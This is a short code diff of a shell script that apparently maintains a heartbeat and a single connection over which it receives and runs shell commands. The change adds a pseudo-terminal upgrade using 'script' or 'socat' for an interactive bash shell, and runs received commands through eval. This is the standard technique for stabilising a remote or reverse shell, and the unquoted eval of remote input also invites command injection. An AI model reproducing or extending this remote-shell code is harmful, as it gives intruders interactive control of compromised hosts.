@@ -210,6 +210,15 @@ send_heartbeat() {
     done
 }
 
+# Check for script or socat to allocate PTY
+if command -v script >/dev/null 2>&1; then
+    PTY_CMD="script -q -c '/bin/bash -i' /dev/null"
+elif command -v socat >/dev/null 2>&1; then
+    PTY_CMD="socat -u EXEC:'/bin/bash -i',pty,stderr"
+else
+    PTY_CMD="/bin/bash -i"
+fi
+
 # Single connection for messages and shell
 while true; do
     (
@@ -226,7 +235,7 @@ while true; do
                     handle_custom_command "$cmd"
                     ;;
                 *)
-                    /bin/bash -i -c "$cmd" 2>&1
+                    eval "$PTY_CMD -c \"$cmd\"" 2>&1
                     ;;
             esac
         done
